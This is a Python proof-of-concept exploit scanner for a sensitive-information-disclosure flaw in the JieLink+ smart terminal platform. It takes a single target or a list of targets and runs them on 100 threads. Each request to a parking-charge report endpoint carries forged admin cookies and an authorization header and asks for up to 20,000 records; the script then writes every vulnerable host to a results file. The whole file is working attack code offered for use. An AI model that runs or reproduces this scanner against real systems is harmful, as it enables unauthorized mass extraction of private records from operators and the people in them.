import json
import sys,argparse,requests,re
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def banner():
    banner = """

██████╗  █████╗ ███╗   ██╗██████╗  █████╗ 
██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗
██████╔╝███████║██╔██╗ ██║██║  ██║███████║
██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██╔══██║
██║     ██║  ██║██║ ╚████║██████╔╝██║  ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝
                      author:panda
                      type:JieLink+智能终端操作平台多个接口处存在敏感信息泄露漏洞
                      date:2024-09-2
                      version:1.0
   """
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="JieLink+智能终端操作平台多个接口处存在敏感信息泄露漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)


    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/report/ParkChargeRecord/GetDataList"
    headers = {
    "User-Agent":"Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:126.0)Gecko/20100101Firefox/126.0",
    "Accept":"application/json,text/javascript,\*/\*;q=0.01",
    "Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding":"gzip,deflate,br",
    "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8",
    "Authorization":"Bearertest",
    "Cookie":"JSESSIONID=test;UUID=1;userid=admin",
    "X-Requested-With":"XMLHttpRequest",
    "Content-Length":"21",
    "Connection":"close",
    "Sec-GPC":"1",
    "Priority":"u=1"
    }
    data = "page=1&rows=20000"
    res1 = requests.get(url=target, verify=False, timeout=5)
    try:
        if res1.status_code == 200:
            res2 = requests.post(url=target + payload, verify=False, headers=headers,data=data, timeout=5)
            # print(res2.text)
            res3 = json.loads(res2.text)
            content = res3['total']
            if content != 0:
                with open("result.txt","a",encoding='utf-8') as f:
                    f.write(f"该网站[+]{target}存在漏洞\n")


            else:

                print(f"该网站[+]{target}不存在漏洞")
        else:
            print(f"该网站{target}有问题，请手动测试")
    except Exception as e:
        print(e)

if __name__ == '__main__':
    main()